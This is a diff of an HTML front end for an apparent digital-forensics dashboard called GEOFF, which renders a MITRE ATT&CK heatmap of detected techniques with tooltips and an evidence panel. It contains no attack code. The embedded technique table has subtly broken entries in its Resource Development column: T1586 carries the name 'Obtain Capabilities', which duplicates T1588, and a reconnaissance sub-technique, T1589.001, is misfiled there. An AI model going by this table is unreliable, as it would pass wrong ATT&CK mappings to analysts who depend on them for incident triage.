@@ -3,490 +3,1540 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Geoff DFIR — MITRE ATT&CK Heatmap</title>
-<script src="https://d3js.org/d3.v7.min.js"></script>
+<title>GEOFF - MITRE ATT&CK Heatmap</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
-  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-  :root{
-    --bg:#0B1220;--surface:#1E293B;--surface2:#263548;--border:#334155;
-    --text:#F1F5F9;--text2:#94A3B8;--text3:#64748B;
-    --green:#10B981;--yellow:#F59E0B;--orange:#F97316;--red:#EF4444;
-    --green-bg:rgba(16,185,129,0.18);--yellow-bg:rgba(245,158,11,0.18);
-    --orange-bg:rgba(249,115,22,0.18);--red-bg:rgba(239,68,68,0.18);
-    --cell-w:160px;--cell-h:46px;--gap:3px;--header-h:90px;
-  }
-  html,body{height:100%;overflow:hidden}
-  body{background:var(--bg);color:var(--text);font-family:'IBM Plex Mono','SF Mono','Cascadia Code',Consolas,monospace;font-size:13px;line-height:1.4}
+:root {
+    --bg-deep: #0a0c10;
+    --bg-primary: #0f1117;
+    --bg-card: #151820;
+    --bg-elevated: #1a1e28;
+    --bg-hover: #222736;
+    --border: #252a36;
+    --border-light: #2e3444;
+    --text-primary: #e8ecf4;
+    --text-secondary: #8b92a5;
+    --text-muted: #565d73;
+    --accent-red: #e5303e;
+    --accent-red-glow: rgba(229, 48, 62, 0.25);
+    --accent-red-dim: rgba(229, 48, 62, 0.08);
+    --accent-amber: #f0a030;
+    --accent-geoff: #e5303e;
+    --cell-detected: #e5303e;
+    --cell-detected-hover: #f04050;
+    --cell-not-detected: rgba(255,255,255,0.03);
+    --cell-not-detected-border: rgba(255,255,255,0.06);
+    --scrollbar-bg: #151820;
+    --scrollbar-thumb: #2e3444;
+}
 
-  .app{display:flex;flex-direction:column;height:100vh}
+* { margin:0; padding:0; box-sizing:border-box; }
 
-  /* Header */
-  .header{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;background:var(--surface);border-bottom:1px solid var(--border);flex-shrink:0;gap:16px;flex-wrap:wrap}
-  .header-left{display:flex;align-items:center;gap:14px}
-  .logo{font-size:18px;font-weight:800;letter-spacing:1px;color:var(--text)}
-  .logo span{color:var(--green)}
-  .header-badge{font-size:10px;padding:2px 8px;border-radius:4px;background:var(--green-bg);color:var(--green);font-weight:700;letter-spacing:0.5px;text-transform:uppercase}
-  .header-right{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+body {
+    background: var(--bg-deep);
+    color: var(--text-primary);
+    font-family: 'Space Grotesk', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
 
-  .search-box{position:relative}
-  .search-box input{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:7px 12px 7px 32px;color:var(--text);font-family:inherit;font-size:12px;width:220px;outline:none;transition:border-color .2s}
-  .search-box input:focus{border-color:var(--green)}
-  .search-box svg{position:absolute;left:9px;top:50%;transform:translateY(-50%);color:var(--text3)}
+::-webkit-scrollbar { width:6px; height:6px; }
+::-webkit-scrollbar-track { background: var(--scrollbar-bg); }
+::-webkit-scrollbar-thumb { background: var(--scrollbar-thumb); border-radius:3px; }
 
-  .btn{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;border-radius:6px;border:1px solid var(--border);background:var(--surface2);color:var(--text2);font-family:inherit;font-size:12px;cursor:pointer;transition:all .2s;font-weight:500;white-space:nowrap}
-  .btn:hover{background:var(--border);color:var(--text)}
-  .btn-primary{background:var(--green);color:#0B1220;border-color:var(--green);font-weight:700}
-  .btn-primary:hover{background:#059669;border-color:#059669}
+/* Ambient background */
+.ambient-bg {
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    pointer-events: none; z-index:0;
+    background:
+        radial-gradient(ellipse 800px 400px at 20% 10%, rgba(229,48,62,0.04), transparent),
+        radial-gradient(ellipse 600px 600px at 80% 80%, rgba(229,48,62,0.02), transparent);
+}
 
-  /* Stats bar */
-  .stats-bar{display:flex;gap:24px;padding:10px 24px;background:rgba(30,41,59,0.5);border-bottom:1px solid var(--border);flex-shrink:0;align-items:center;flex-wrap:wrap}
-  .stat{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--text3)}
-  .stat .val{font-weight:700;color:var(--text);font-size:14px}
-  .stat .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+/* Header */
+.app-header {
+    position: sticky; top:0; z-index:100;
+    background: rgba(10,12,16,0.85);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+    padding: 14px 28px;
+    display: flex; align-items: center; justify-content: space-between;
+}
+.brand {
+    display: flex; align-items: center; gap: 12px;
+}
+.brand-mark {
+    width: 36px; height: 36px;
+    background: var(--accent-red);
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 700; font-size: 14px; color: #fff;
+    box-shadow: 0 0 20px var(--accent-red-glow);
+}
+.brand-text {
+    font-weight: 700; font-size: 20px; letter-spacing: 3px; color: var(--text-primary);
+}
+.brand-sub {
+    font-size: 11px; color: var(--text-muted); letter-spacing: 1px; margin-top:1px;
+}
+.header-meta {
+    display: flex; align-items: center; gap: 24px;
+}
+.case-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px; color: var(--text-secondary);
+    background: var(--bg-elevated);
+    border: 1px solid var(--border);
+    padding: 6px 14px; border-radius: 6px;
+}
+.status-indicator {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 12px; color: var(--text-secondary);
+}
+.status-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    background: #2ecc71;
+    box-shadow: 0 0 8px rgba(46,204,113,0.4);
+    animation: pulse-dot 2s ease-in-out infinite;
+}
+.status-dot.loading { background: var(--accent-amber); box-shadow: 0 0 8px rgba(240,160,48,0.4); }
+.status-dot.error { background: var(--accent-red); box-shadow: 0 0 8px var(--accent-red-glow); }
 
-  /* Legend */
-  .legend{display:flex;align-items:center;gap:16px;padding:8px 24px;background:rgba(30,41,59,0.3);border-bottom:1px solid rgba(51,65,85,0.4);flex-shrink:0;flex-wrap:wrap}
-  .legend-title{font-size:11px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:1px}
-  .legend-item{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--text2)}
-  .legend-swatch{width:14px;height:14px;border-radius:3px;flex-shrink:0}
-  .legend-sep{width:1px;height:16px;background:var(--border)}
+@keyframes pulse-dot {
+    0%,100% { opacity:1; } 50% { opacity:0.5; }
+}
 
-  /* Heatmap area */
-  .heatmap-wrap{flex:1;overflow:auto;padding:20px 24px 24px}
-  .heatmap-inner{display:flex;gap:var(--gap);min-width:max-content}
+/* Stats bar */
+.stats-bar {
+    display: flex; align-items: center; gap: 20px;
+    padding: 12px 28px;
+    background: var(--bg-primary);
+    border-bottom: 1px solid var(--border);
+    position: sticky; top: 62px; z-index: 99;
+    flex-wrap: wrap;
+}
+.stat-chip {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 13px; color: var(--text-secondary);
+    padding: 5px 14px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+}
+.stat-chip .val {
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 700; color: var(--text-primary);
+}
+.stat-chip.detected .val { color: var(--accent-red); }
+.stat-chip .icon { font-size: 12px; color: var(--text-muted); }
 
-  /* Tactic column */
-  .tactic-col{display:flex;flex-direction:column;min-width:var(--cell-w)}
-  .tactic-header{
-    height:var(--header-h);display:flex;align-items:center;justify-content:center;
-    padding:6px 8px;text-align:center;font-size:11.5px;font-weight:700;
-    color:var(--text);background:var(--surface);border-radius:6px 6px 0 0;
-    border:1px solid var(--border);border-bottom:2px solid var(--green);
-    letter-spacing:0.3px;line-height:1.3;writing-mode:vertical-lr;transform:rotate(180deg);
-    text-overflow:ellipsis;overflow:hidden;
-  }
-  .tactic-header.short-name{writing-mode:horizontal-tb;transform:none}
+.filter-group {
+    display: flex; gap: 6px; margin-left: auto;
+}
+.filter-btn {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 12px; color: var(--text-secondary);
+    padding: 5px 14px; border-radius: 5px;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    cursor: pointer; transition: all 0.2s;
+}
+.filter-btn:hover { background: var(--bg-hover); color: var(--text-primary); }
+.filter-btn.active { background: var(--accent-red); color: #fff; border-color: var(--accent-red); }
 
-  .technique-list{display:flex;flex-direction:column;gap:var(--gap)}
+/* Main content */
+.main-content {
+    padding: 24px 28px 60px;
+    position: relative; z-index:1;
+}
 
-  /* Technique cell */
-  .tech-cell{
-    height:var(--cell-h);border-radius:4px;padding:6px 8px;cursor:pointer;
-    display:flex;flex-direction:column;justify-content:center;
-    border:1px solid transparent;transition:all .15s ease;position:relative;overflow:hidden;
-  }
-  .tech-cell .tech-id{font-size:10.5px;font-weight:700;opacity:0.85;letter-spacing:0.3px}
-  .tech-cell .tech-name{font-size:11px;font-weight:500;opacity:0.7;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:1px}
-  .tech-cell::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;border-radius:4px 0 0 4px}
+/* Matrix grid */
+.matrix-container {
+    overflow-x: auto;
+    padding-bottom: 20px;
+}
+.matrix-table {
+    display: grid;
+    gap: 3px;
+    min-width: max-content;
+}
 
-  .tech-cell.conf-0{background:rgba(30,41,59,0.4);border-color:rgba(51,65,85,0.3);color:var(--text3)}
-  .tech-cell.conf-0 .tech-id,.tech-cell.conf-0 .tech-name{opacity:0.4}
-  .tech-cell.conf-0:hover{background:rgba(30,41,59,0.7);border-color:var(--border)}
+/* Tactic header */
+.tactic-header {
+    background: var(--bg-elevated);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 8px;
+    text-align: center;
+    position: sticky; top: 0; z-index: 10;
+}
+.tactic-name {
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--text-primary);
+    letter-spacing: 0.5px;
+    line-height: 1.3;
+}
+.tactic-count {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--text-muted);
+    margin-top: 4px;
+}
+.tactic-count .det-count { color: var(--accent-red); font-weight: 700; }
 
-  .tech-cell.conf-1{background:var(--green-bg);border-color:rgba(16,185,129,0.25);color:var(--green)}
-  .tech-cell.conf-1::before{background:var(--green)}
-  .tech-cell.conf-1:hover{background:rgba(16,185,129,0.3);border-color:var(--green);box-shadow:0 0 12px rgba(16,185,129,0.25)}
+/* Technique cell */
+.tech-cell {
+    width: 100%;
+    min-height: 48px;
+    border-radius: 4px;
+    padding: 6px 7px;
+    cursor: pointer;
+    transition: all 0.18s ease;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+.tech-cell.not-detected {
+    background: var(--cell-not-detected);
+    border: 1px solid var(--cell-not-detected-border);
+}
+.tech-cell.not-detected:hover {
+    background: rgba(255,255,255,0.06);
+    border-color: rgba(255,255,255,0.12);
+}
+.tech-cell.detected {
+    background: rgba(229,48,62,0.15);
+    border: 1px solid rgba(229,48,62,0.35);
+    box-shadow: 0 0 12px rgba(229,48,62,0.08);
+}
+.tech-cell.detected:hover {
+    background: rgba(229,48,62,0.25);
+    border-color: rgba(229,48,62,0.55);
+    box-shadow: 0 0 20px rgba(229,48,62,0.15);
+}
+.tech-cell.detected::before {
+    content: '';
+    position: absolute; top: 3px; right: 3px;
+    width: 6px; height: 6px;
+    background: var(--accent-red);
+    border-radius: 50%;
+    box-shadow: 0 0 6px var(--accent-red-glow);
+}
+.tech-id {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    font-weight: 500;
+    line-height: 1.2;
+}
+.not-detected .tech-id { color: var(--text-muted); }
+.detected .tech-id { color: var(--accent-red); }
+.tech-name {
+    font-size: 10px;
+    line-height: 1.3;
+    margin-top: 2px;
+    overflow: hidden;
+    display: -webkit-box;
+    -webkit-line-clamp: 2;
+    -webkit-box-orient: vertical;
+}
+.not-detected .tech-name { color: var(--text-muted); opacity:0.6; }
+.detected .tech-name { color: var(--text-primary); }
+.tech-evidence-count {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 9px;
+    color: rgba(229,48,62,0.7);
+    margin-top: 2px;
+}
 
-  .tech-cell.conf-2{background:var(--yellow-bg);border-color:rgba(245,158,11,0.25);color:var(--yellow)}
-  .tech-cell.conf-2::before{background:var(--yellow)}
-  .tech-cell.conf-2:hover{background:rgba(245,158,11,0.3);border-color:var(--yellow);box-shadow:0 0 12px rgba(245,158,11,0.25)}
+/* Detail panel */
+.detail-overlay {
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    background: rgba(0,0,0,0.6);
+    z-index: 500;
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.25s;
+}
+.detail-overlay.visible { opacity:1; pointer-events:all; }
 
-  .tech-cell.conf-3{background:var(--orange-bg);border-color:rgba(249,115,22,0.25);color:var(--orange)}
-  .tech-cell.conf-3::before{background:var(--orange)}
-  .tech-cell.conf-3:hover{background:rgba(249,115,22,0.3);border-color:var(--orange);box-shadow:0 0 12px rgba(249,115,22,0.25)}
+.detail-panel {
+    position: fixed; top:0; right:0; width: 480px; max-width:90vw;
+    height: 100vh;
+    background: var(--bg-primary);
+    border-left: 1px solid var(--border);
+    z-index: 501;
+    transform: translateX(100%);
+    transition: transform 0.3s cubic-bezier(0.16,1,0.3,1);
+    overflow-y: auto;
+    box-shadow: -10px 0 40px rgba(0,0,0,0.5);
+}
+.detail-panel.visible { transform: translateX(0); }
 
-  .tech-cell.conf-4{background:var(--red-bg);border-color:rgba(239,68,68,0.3);color:var(--red)}
-  .tech-cell.conf-4::before{background:var(--red)}
-  .tech-cell.conf-4:hover{background:rgba(239,68,68,0.35);border-color:var(--red);box-shadow:0 0 14px rgba(239,68,68,0.3)}
+.detail-header {
+    padding: 24px;
+    border-bottom: 1px solid var(--border);
+    position: sticky; top:0;
+    background: var(--bg-primary);
+    z-index: 2;
+}
+.detail-close {
+    position: absolute; top:16px; right:16px;
+    width: 32px; height: 32px;
+    background: var(--bg-elevated);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text-secondary);
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+    transition: all 0.2s;
+}
+.detail-close:hover { background: var(--bg-hover); color: var(--text-primary); }
+.detail-tactic {
+    font-size: 11px; color: var(--text-muted);
+    text-transform: uppercase; letter-spacing: 1.5px;
+    margin-bottom: 6px;
+}
+.detail-id {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 22px; font-weight: 700;
+    color: var(--accent-red);
+    margin-bottom: 4px;
+}
+.detail-name {
+    font-size: 16px; font-weight: 500;
+    color: var(--text-primary);
+    line-height: 1.4;
+}
+.detail-status {
+    display: inline-flex; align-items: center; gap: 6px;
+    margin-top: 12px; padding: 4px 12px;
+    border-radius: 4px; font-size: 11px; font-weight: 600;
+    letter-spacing: 0.5px;
+}
+.detail-status.detected-status {
+    background: rgba(229,48,62,0.15);
+    color: var(--accent-red);
+    border: 1px solid rgba(229,48,62,0.3);
+}
+.detail-status.not-detected-status {
+    background: rgba(255,255,255,0.04);
+    color: var(--text-muted);
+    border: 1px solid rgba(255,255,255,0.08);
+}
 
-  .tech-cell.highlight{outline:2px solid var(--green);outline-offset:-1px;z-index:2}
+.detail-body { padding: 24px; }
+.detail-section { margin-bottom: 28px; }
+.detail-section-title {
+    font-size: 11px; font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    margin-bottom: 14px;
+    display: flex; align-items: center; gap: 8px;
+}
+.detail-section-title i { font-size: 12px; }
 
-  /* Tooltip */
-  .tooltip{
-    position:fixed;pointer-events:none;z-index:9999;
-    background:#111827;border:1px solid var(--border);border-radius:8px;
-    padding:12px 14px;max-width:320px;opacity:0;transition:opacity .12s;
-    box-shadow:0 8px 32px rgba(0,0,0,0.5);
-  }
-  .tooltip.visible{opacity:1}
-  .tooltip .tt-id{font-size:11px;font-weight:700;letter-spacing:0.5px;margin-bottom:2px}
-  .tooltip .tt-name{font-size:13px;font-weight:600;color:var(--text);margin-bottom:6px}
-  .tooltip .tt-desc{font-size:11px;color:var(--text3);line-height:1.5;margin-bottom:8px}
-  .tooltip .tt-confidence{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600}
-  .tooltip .tt-dot{width:10px;height:10px;border-radius:3px}
+.evidence-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin-bottom: 10px;
+    transition: border-color 0.2s;
+}
+.evidence-card:hover { border-color: var(--border-light); }
+.evidence-type {
+    font-size: 10px; font-weight: 600;
+    text-transform: uppercase; letter-spacing: 1px;
+    margin-bottom: 6px;
+    display: flex; align-items: center; gap: 6px;
+}
+.evidence-type.file { color: #5dade2; }
+.evidence-type.ioc { color: var(--accent-amber); }
+.evidence-type.finding { color: #a569bd; }
+.evidence-type.network { color: #58d68d; }
+.evidence-text {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px; color: var(--text-primary);
+    line-height: 1.5;
+    word-break: break-all;
+}
+.no-evidence {
+    color: var(--text-muted);
+    font-size: 13px;
+    font-style: italic;
+    padding: 20px 0;
+}
 
-  /* Loading overlay */
-  .loading-overlay{position:absolute;inset:0;background:rgba(11,18,32,0.8);display:flex;align-items:center;justify-content:center;z-index:100;border-radius:8px}
-  .spinner{width:28px;height:28px;border:3px solid var(--border);border-top-color:var(--green);border-radius:50%;animation:spin .7s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
+/* Tooltip */
+.hover-tooltip {
+    position: fixed;
+    z-index: 400;
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-light);
+    border-radius: 8px;
+    padding: 12px 16px;
+    max-width: 340px;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.15s;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+}
+.hover-tooltip.visible { opacity:1; }
+.hover-tooltip .tt-id {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px; font-weight: 700;
+    color: var(--accent-red);
+    margin-bottom: 3px;
+}
+.hover-tooltip .tt-name {
+    font-size: 12px; color: var(--text-primary);
+    margin-bottom: 6px; line-height: 1.3;
+}
+.hover-tooltip .tt-hint {
+    font-size: 10px; color: var(--text-muted);
+}
+.hover-tooltip .tt-findings {
+    margin-top: 8px; padding-top: 8px;
+    border-top: 1px solid var(--border);
+}
+.hover-tooltip .tt-finding-item {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px; color: var(--text-secondary);
+    padding: 2px 0;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    max-width: 280px;
+}
 
-  /* Notification toast */
-  .toast{position:fixed;bottom:24px;right:24px;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:12px 18px;font-size:12px;color:var(--text);z-index:10000;opacity:0;transform:translateY(10px);transition:all .3s;box-shadow:0 4px 20px rgba(0,0,0,0.4)}
-  .toast.show{opacity:1;transform:translateY(0)}
-  .toast.success{border-left:3px solid var(--green)}
-  .toast.error{border-left:3px solid var(--red)}
+/* Loading state */
+.loading-state {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 120px 20px;
+}
+.loader-ring {
+    width: 48px; height: 48px;
+    border: 3px solid var(--border);
+    border-top-color: var(--accent-red);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.loader-text {
+    margin-top: 16px; font-size: 13px; color: var(--text-muted);
+}
 
-  /* Scrollbar */
-  ::-webkit-scrollbar{width:8px;height:8px}
-  ::-webkit-scrollbar-track{background:var(--bg)}
-  ::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
-  ::-webkit-scrollbar-thumb:hover{background:var(--text3)}
+/* Error state */
+.error-state {
+    text-align: center; padding: 80px 20px;
+}
+.error-state i { font-size: 40px; color: var(--accent-red); margin-bottom: 16px; }
+.error-state h3 { font-size: 18px; color: var(--text-primary); margin-bottom: 8px; }
+.error-state p { font-size: 13px; color: var(--text-secondary); margin-bottom: 20px; }
+.retry-btn {
+    font-family: 'Space Grotesk', sans-serif;
+    background: var(--accent-red); color: #fff;
+    border: none; padding: 10px 24px; border-radius: 6px;
+    font-size: 13px; font-weight: 600; cursor: pointer;
+    transition: all 0.2s;
+}
+.retry-btn:hover { background: var(--cell-detected-hover); }
 
-  /* Responsive */
-  @media(max-width:768px){
-    .header{padding:10px 14px}
-    .stats-bar,.legend{padding:8px 14px}
-    .heatmap-wrap{padding:14px}
-    .search-box input{width:160px}
-    :root{--cell-w:130px;--cell-h:40px;--header-h:70px}
-  }
+/* Empty state for no detections */
+.empty-detect {
+    text-align: center; padding: 60px 20px;
+    color: var(--text-muted); font-size: 14px;
+}
+
+/* Responsive */
+@media (max-width: 768px) {
+    .app-header { padding: 12px 16px; }
+    .stats-bar { padding: 10px 16px; }
+    .main-content { padding: 16px; }
+    .filter-group { margin-left: 0; margin-top: 8px; width: 100%; }
+    .detail-panel { width: 100vw; max-width: 100vw; }
+}
+
+/* Scan line animation on detected cells */
+@keyframes scanline {
+    0% { background-position: 0 0; }
+    100% { background-position: 0 100%; }
+}
+.tech-cell.detected {
+    background-image: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(229,48,62,0.03) 2px,
+        rgba(229,48,62,0.03) 4px
+    );
+    background-size: 100% 200%;
+    animation: scanline 8s linear infinite;
+}
+
+@media (prefers-reduced-motion: reduce) {
+    .tech-cell.detected { animation: none; }
+    .status-dot { animation: none; }
+}
 </style>
 </head>
 <body>
-<div class="app">
-  <!-- Header -->
-  <div class="header">
-    <div class="header-left">
-      <div class="logo">GEOFF<span>.</span>DFIR</div>
-      <div class="header-badge">MITRE ATT&amp;CK</div>
+
+<div class="ambient-bg"></div>
+
+<!-- Header -->
+<header class="app-header">
+    <div class="brand">
+        <div class="brand-mark">G</div>
+        <div>
+            <div class="brand-text">GEOFF</div>
+            <div class="brand-sub">MITRE ATT&CK Heatmap</div>
+        </div>
     </div>
-    <div class="header-right">
-      <div class="search-box">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-        <input type="text" id="searchInput" placeholder="Search technique..." autocomplete="off"/>
-      </div>
-      <button class="btn" id="btnReset" title="Reset to sample data">Reset</button>
-      <button class="btn btn-primary" id="btnLoad" title="Load data from API">Load Case Data</button>
+    <div class="header-meta">
+        <div class="case-badge" id="caseBadge">CASE: --</div>
+        <div class="status-indicator">
+            <div class="status-dot loading" id="statusDot"></div>
+            <span id="statusText">Initializing...</span>
+        </div>
     </div>
-  </div>
+</header>
 
-  <!-- Stats -->
-  <div class="stats-bar" id="statsBar"></div>
+<!-- Stats bar -->
+<div class="stats-bar" id="statsBar">
+    <div class="stat-chip detected">
+        <i class="fa-solid fa-crosshairs icon"></i>
+        <span>Detected:</span>
+        <span class="val" id="statDetected">0</span>
+    </div>
+    <div class="stat-chip">
+        <i class="fa-solid fa-table-cells icon"></i>
+        <span>Total:</span>
+        <span class="val" id="statTotal">0</span>
+    </div>
+    <div class="stat-chip">
+        <i class="fa-solid fa-file-lines icon"></i>
+        <span>Evidence Items:</span>
+        <span class="val" id="statEvidence">0</span>
+    </div>
+    <div class="stat-chip">
+        <i class="fa-solid fa-shield-halved icon"></i>
+        <span>Coverage:</span>
+        <span class="val" id="statCoverage">0%</span>
+    </div>
+    <div class="filter-group">
+        <button class="filter-btn active" data-filter="all">All</button>
+        <button class="filter-btn" data-filter="detected">Detected Only</button>
+        <button class="filter-btn" data-filter="undetected">Not Detected</button>
+    </div>
+</div>
 
-  <!-- Legend -->
-  <div class="legend">
-    <span class="legend-title">Confidence</span>
-    <div class="legend-item"><div class="legend-swatch" style="background:rgba(30,41,59,0.6);border:1px solid var(--border)"></div>Not Detected</div>
-    <div class="legend-sep"></div>
-    <div class="legend-item"><div class="legend-swatch" style="background:var(--green)"></div>Low</div>
-    <div class="legend-sep"></div>
-    <div class="legend-item"><div class="legend-swatch" style="background:var(--yellow)"></div>Medium</div>
-    <div class="legend-sep"></div>
-    <div class="legend-item"><div class="legend-swatch" style="background:var(--orange)"></div>High</div>
-    <div class="legend-sep"></div>
-    <div class="legend-item"><div class="legend-swatch" style="background:var(--red)"></div>Critical</div>
-  </div>
+<!-- Main -->
+<main class="main-content">
+    <div id="loadingState" class="loading-state">
+        <div class="loader-ring"></div>
+        <div class="loader-text">Loading case data and mapping techniques...</div>
+    </div>
+    <div id="errorState" class="error-state" style="display:none;"></div>
+    <div id="matrixContainer" class="matrix-container" style="display:none;"></div>
+</main>
 
-  <!-- Heatmap -->
-  <div class="heatmap-wrap" id="heatmapWrap">
-    <div class="heatmap-inner" id="heatmapInner"></div>
-  </div>
+<!-- Tooltip -->
+<div class="hover-tooltip" id="hoverTooltip">
+    <div class="tt-id" id="ttId"></div>
+    <div class="tt-name" id="ttName"></div>
+    <div class="tt-hint" id="ttHint"></div>
+    <div class="tt-findings" id="ttFindings" style="display:none;"></div>
+</div>
 
-  <!-- Tooltip -->
-  <div class="tooltip" id="tooltip"></div>
-
-  <!-- Toast -->
-  <div class="toast" id="toast"></div>
+<!-- Detail overlay + panel -->
+<div class="detail-overlay" id="detailOverlay"></div>
+<div class="detail-panel" id="detailPanel">
+    <div class="detail-header">
+        <button class="detail-close" id="detailClose" aria-label="Close detail panel"><i class="fa-solid fa-xmark"></i></button>
+        <div class="detail-tactic" id="detailTactic"></div>
+        <div class="detail-id" id="detailId"></div>
+        <div class="detail-name" id="detailName"></div>
+        <div class="detail-status" id="detailStatus"></div>
+    </div>
+    <div class="detail-body" id="detailBody"></div>
 </div>
 
 <script>
-// ─── Sample Data ────────────────────────────────────────────────
-const SAMPLE_DATA = [
-  { tactic:"Reconnaissance", id:"T1595", name:"Active Scanning", desc:"Adversaries may scan victim networks to gather information for targeting", confidence:2 },
-  { tactic:"Reconnaissance", id:"T1592", name:"Gather Victim Host Info", desc:"Adversaries may gather information about the victim's host infrastructure", confidence:1 },
-  { tactic:"Reconnaissance", id:"T1589", name:"Gather Victim Identity Info", desc:"Adversaries may gather information about identities associated with the victim", confidence:3 },
-  { tactic:"Reconnaissance", id:"T1593", name:"Search Open Websites/Domains", desc:"Adversaries may search freely available websites and domains for information", confidence:0 },
+// ============================================
+// MITRE ATT&CK Enterprise Technique Database
+// ============================================
+const MITRE_DATA = {
+    "Reconnaissance": {
+        tactics_id: "TA0043",
+        techniques: [
+            { id:"T1595", name:"Active Scanning" },
+            { id:"T1592", name:"Gather Victim Host Information" },
+            { id:"T1589", name:"Gather Victim Identity Information" },
+            { id:"T1590", name:"Gather Victim Network Information" },
+            { id:"T1591", name:"Gather Victim Org Information" },
+            { id:"T1598", name:"Phishing for Information" },
+            { id:"T1597", name:"Search Closed Sources" },
+            { id:"T1596", name:"Search Open Technical Databases" },
+            { id:"T1593", name:"Search Open Websites/Domains" },
+            { id:"T1594", name:"Search Victim-Owned Websites" }
+        ]
+    },
+    "Resource Development": {
+        tactics_id: "TA0042",
+        techniques: [
+            { id:"T1583", name:"Acquire Infrastructure" },
+            { id:"T1584", name:"Compromise Infrastructure" },
+            { id:"T1585", name:"Establish Accounts" },
+            { id:"T1586", name:"Obtain Capabilities" },
+            { id:"T1587", name:"Develop Capabilities" },
+            { id:"T1588", name:"Obtain Capabilities" },
+            { id:"T1608", name:"Stage Capabilities" },
+            { id:"T1589.001", name:"Credentials" }
+        ]
+    },
+    "Initial Access": {
+        tactics_id: "TA0001",
+        techniques: [
+            { id:"T1190", name:"Exploit Public-Facing Application" },
+            { id:"T1133", name:"External Remote Services" },
+            { id:"T1200", name:"Hardware Additions" },
+            { id:"T1566", name:"Phishing" },
+            { id:"T1091", name:"Replication Through Removable Media" },
+            { id:"T1195", name:"Supply Chain Compromise" },
+            { id:"T1199", name:"Trusted Relationship" },
+            { id:"T1078", name:"Valid Accounts" }
+        ]
+    },
+    "Execution": {
+        tactics_id: "TA0002",
+        techniques: [
+            { id:"T1059", name:"Command and Scripting Interpreter" },
+            { id:"T1609", name:"Container Administration Command" },
+            { id:"T1203", name:"Exploitation for Client Execution" },
+            { id:"T1053", name:"Scheduled Task/Job" },
+            { id:"T1129", name:"Shared Modules" },
+            { id:"T1072", name:"Software Deployment Tools" },
+            { id:"T1569", name:"System Services" },
+            { id:"T1559", name:"Inter-Process Communication" },
+            { id:"T1047", name:"Windows Management Instrumentation" }
+        ]
+    },
+    "Persistence": {
+        tactics_id: "TA0003",
+        techniques: [
+            { id:"T1098", name:"Account Manipulation" },
+            { id:"T1197", name:"BITS Jobs" },
+            { id:"T1547", name:"Boot or Logon Autostart Execution" },
+            { id:"T1037", name:"Boot or Logon Initialization Scripts" },
+            { id:"T1136", name:"Create Account" },
+            { id:"T1543", name:"Create or Modify System Process" },
+            { id:"T1546", name:"Event Triggered Execution" },
+            { id:"T1133", name:"External Remote Services" },
+            { id:"T1574", name:"Hijack Execution Flow" },
+            { id:"T1525", name:"Implant Internal Image" },
+            { id:"T1554", name:"Modify System Image" },
+            { id:"T1053", name:"Scheduled Task/Job" },
